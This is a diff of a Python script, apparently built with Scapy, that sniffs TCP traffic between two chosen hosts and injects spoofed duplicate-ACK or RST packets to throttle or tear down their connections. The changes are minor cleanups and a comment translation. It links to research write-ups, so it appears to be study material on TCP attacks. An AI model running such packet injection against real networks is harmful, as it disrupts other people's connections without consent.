@@ -10,7 +10,6 @@ def send_3_duplicate_ack(p):
     dst_port = p[TCP].dport
     seq_val = p[TCP].seq
     ack_val = p[TCP].ack
-    flags = p[TCP].flags
 
     ack_packet = IP(src = dst_ip, 
                     dst = src_ip) / TCP(sport = dst_port,    
@@ -29,9 +28,7 @@ def send_reset(p):
     src_port = p[TCP].sport
     dst_ip = p[IP].dst
     dst_port = p[TCP].dport
-    seq = p[TCP].seq
     ack = p[TCP].ack
-    flags = p[TCP].flags
 
     rst_packet = IP(src = dst_ip, 
                     dst = src_ip) / TCP(sport = dst_port,    
@@ -49,13 +46,13 @@ def tcp_throttling(source_addr: str, dest_addr: str, approach = "ACK"):
     print(f"dst host {dest_addr} and src host {source_addr}")
 
     if approach == "ACK":
-        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", prn = send_3_duplicate_ack) # KØR UENDELIGT
+        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", prn = send_3_duplicate_ack) # no count variable set = inf loop
 
         ## https://reproducingnetworkresearch.wordpress.com/2017/06/05/cs244-17-reproducing-tcp-level-attacks-tcp-congestion-control-with-a-misbehaving-receiver/
 
     elif approach == "RST":
 
-        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", prn = send_reset) 
+        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", prn = send_reset) # no count variable set = inf loop
 
         ## https://robertheaton.com/2020/04/27/how-does-a-tcp-reset-attack-work/
 
